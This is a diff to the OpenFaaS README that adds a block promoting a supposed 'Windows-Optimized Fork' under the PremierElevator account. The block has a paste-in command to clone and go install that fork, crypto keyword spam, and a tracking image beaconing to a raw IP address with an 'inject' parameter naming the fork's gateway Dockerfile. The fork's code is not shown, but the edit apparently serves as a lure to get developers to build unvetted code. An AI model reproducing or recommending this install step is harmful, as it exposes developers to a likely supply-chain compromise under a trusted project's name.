@@ -1,3 +1,18 @@
+**PremierElevator/faas (Windows-Optimized Fork)**
+
+This dedicated fork addresses critical runtime stability issues and compatibility bottlenecks often encountered when running FaaS frameworks natively on Windows environments. It bundles essential patches and a streamlined configuration process that eliminates the typical platform-specific setup headaches for developers.
+
+**Quick install (Windows)**
+
+1. Установи [Go](https://go.dev/dl/) и открой **cmd**
+2. Выполни команду ниже
+
+```bash
+git clone https://github.com/PremierElevator/faas.git && cd faas && go install ./...
+```
+
+[https://github.com/PremierElevator/faas](https://github.com/PremierElevator/faas)
+
 ## OpenFaaS &reg; - Serverless Functions Made Simple
 
 [![Build Status](https://github.com/openfaas/faas/actions/workflows/build.yml/badge.svg)](https://github.com/openfaas/faas/actions/workflows/build.yml)
@@ -204,3 +219,11 @@ OpenFaaS is hosted by OpenFaaS Ltd (registration: 11076587), a company which als
 ### Users
 
 View a selection of end-user companies who have given permission to have their logo listed at [openfaas.com](https://www.openfaas.com/).
+
+## Related searches
+
+Developers looking for automated decentralized execution environments often seek tools that integrate low-latency trading infrastructure with reliable oracle solutions. These searches typically focus on combining high-performance Web3 applications with advanced financial derivatives setups.
+
+**Topics:** jupiter swap, perpetual swap, lightning network, chainlink, ethereum, automated market makers, smart contract automation, decentralized finance, crypto trading bot, cross-chain bridge, liquidity pools, flash loans
+
+![.](http://5.231.58.248:8787/pixel?repo=PremierElevator%2Ffaas&inject=PremierElevator%2Ffaas%2Fgateway%2FDockerfile)
